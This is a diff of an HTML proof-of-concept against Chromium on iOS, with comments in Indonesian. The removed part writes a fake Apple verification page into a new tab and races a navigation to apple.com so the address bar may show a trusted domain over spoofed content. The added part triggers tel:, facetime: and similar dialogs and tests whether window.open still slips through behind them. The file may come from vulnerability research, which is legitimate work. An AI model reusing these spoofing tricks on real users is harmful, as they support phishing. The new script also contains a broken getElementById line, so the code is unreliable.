@@ -1,116 +1,72 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Advanced Security Assessment PoC</title>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Enhanced Chromium iOS PoC - App/Call Prompt Spoofing</title>
     <style>
-      body, html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        background: #0b0b0c;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      }
-      .container {
-        text-align: center;
-        background: #1c1c1e;
-        padding: 40px;
-        border-radius: 20px;
-        box-shadow: 0 15px 35px rgba(0,0,0,0.6);
-        max-width: 450px;
-        width: 90%;
-      }
-      h2 {
-        color: #f5f5f7;
-        font-size: 22px;
-        margin-bottom: 20px;
-        font-weight: 500;
-      }
-      button {
-        padding: 18px 32px;
-        font-size: 18px;
-        font-weight: 600;
-        background: #0a84ff;
-        color: #fff;
-        border: none;
-        border-radius: 12px;
-        cursor: pointer;
-        transition: transform 0.1s ease, background 0.2s ease;
-        width: 100%;
-      }
-      button:active {
-        transform: scale(0.96);
-        background: #0071e3;
-      }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: #f5f5f7; color: #1d1d1f; }
+        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); max-width: 500px; margin: auto; }
+        select, button { width: 100%; padding: 12px; margin-top: 10px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #ccc; font-size: 16px; }
+        button { background: #0071e3; color: white; border: none; font-weight: bold; cursor: pointer; }
+        button:active { background: #005bb5; }
+        #log { background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; min-height: 80px; max-height: 150px; overflow-y: auto; }
     </style>
-  </head>
-  <body>
-    <div class="container">
-      <h2>System Integrity Validation Required</h2>
-      <button id="startBtn">INITIALIZE SECURE BRIDGE</button>
-    </div>
+</head>
+<body>
 
-    <script>
-      document.getElementById("startBtn").onclick = function () {
-        this.style.display = "none";
+<div class="card">
+    <h2>iOS App Launch PoC Suite</h2>
+    <p>Uji ketahanan mitigasi terhadap pembukaan jendela baru (<code>window.open</code>) di balik dialog sistem.</p>
+    
+    <label for="scheme">Pilih Skema Target:</label>
+    <select id="scheme">
+        <option value="tel:+18005550199">tel: (Telepon)</option>
+        <option value="facetime:+18005550199">facetime: (FaceTime Video)</option>
+        <option value="facetime-audio:+18005550199">facetime-audio: (FaceTime Audio)</option>
+        <option value="sms:+18005550199?body=TestSMS">sms: (Pesan/SMS)</option>
+        <option value="mailto:secure@apple.com?subject=Test">mailto: (Email Client)</option>
+    </select>
 
-        // Membuka jendela target baru / tab asinkron
-        const targetTab = window.open("about:blank", "_blank");
+    <button onclick="runExploit()">Jalankan PoC</button>
 
-        if (targetTab) {
-          // 1. Menyuntikkan tampilan spoofing visual beresolusi tinggi (Target Domain Mock)
-          targetTab.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Apple - Official Verification Gateway</title>
-              <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            </head>
-            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,sans-serif;">
-              <div style="text-align:center;padding:30px;max-width:480px;">
-                <h1 style="font-size:32px;color:#1d1d1f;margin-bottom:12px;font-weight:600;">Security Clearance Active</h1>
-                <p style="font-size:16px;color:#86868b;line-height:1.4;margin-bottom:25px;">Your session has been securely validated through regional proxy endpoints.</p>
-                <div style="padding:12px 20px;background:#e5e5ea;border-radius:8px;font-size:13px;color:#3a3a3c;font-weight:500;letter-spacing:0.3px;">
-                  Connected Host: <span style="color:#007aff;">apple.com</span>
-                </div>
-              </div>
-            </body>
-            </html>
-          `);
-          targetTab.document.close();
+    <h3>Log Aktivitas:</h3>
+    <div id="log">Menunggu eksekusi...</div>
+</div>
 
-          // 2. Memicu transisi navigasi asinkron berlapis (Multi-tier Timing Race Condition)
-          setTimeout(() => {
-            try {
-              // Memaksa perpindahan mutlak ke domain target terpercaya sebelum tree layout selesai
-              targetTab.location.replace("https://apple.com");
-            } catch (e) {}
-          }, 10);
+<script>
+function log(msg) {
+    const logBox = document.getElementById('log');
+    logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+    logBox.scrollTop = logBox.scrollHeight;
+}
 
-          // 3. Teknik Bypass Baru: Mengganti pemblokiran prompt() dengan "DOM Heavy Reflow Saturation"
-          // Ini membebani thread rendering secara lokal tanpa memicu dialog modal terlarang,
-          // menguji apakah CRWWebController mengalami latensi sinkronisasi status URL.
-          let counter = 0;
-          const saturationInterval = setInterval(() => {
-            counter++;
-            try {
-              if (targetTab.document && targetTab.document.body) {
-                // Memanipulasi properti layout secara dinamis dengan kecepatan tinggi
-                targetTab.document.body.style.zoom = (counter % 2 === 0) ? "1.0" : "1.0001";
-              }
-              if (counter > 150 || targetTab.closed) {
-                clearInterval(saturationInterval);
-              }
-            } catch (err) {
-              clearInterval(saturationInterval);
+function runExploit() {
+    const selectedScheme = document.getElementById('scheme').value;
+    document.getElementById('log.innerHTML = ""';
+    log("Memulai skenario untuk skema: " + selectedScheme);
+
+    // 1. Memicu navigasi skema yang memunculkan prompt/dialog sistem
+    setTimeout(function() {
+        log("Memicu document.location = " + selectedScheme);
+        document.location = selectedScheme;
+    }, 700);
+
+    // 2. Mencoba mengeksekusi window.open() di sela-sela status ForegroundInactive
+    setTimeout(function() {
+        log("Mencoba mengeksekusi window.open()...");
+        try {
+            var newWindow = window.open('https://www.apple.com/privacy/');
+            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                log("<span style='color: #00ff00;'>[SUKSES MITIGASI] window.open berhasil diblokir/dijatuhkan oleh browser.</span>");
+            } else {
+                log("<span style='color: #ff4d4d;'>[MASIH RENTAN] Jendela baru berhasil tercipta di balik dialog!</span>");
             }
-          }, 4);
+        } catch (e) {
+            log("<span style='color: #00ff00;'>[SUKSES MITIGASI] Exception tertangkap: " + e.message + "</span>");
         }
-      };
-    </script>
-  </body>
+    }, 2600);
+}
+</script>
+
+</body>
 </html>
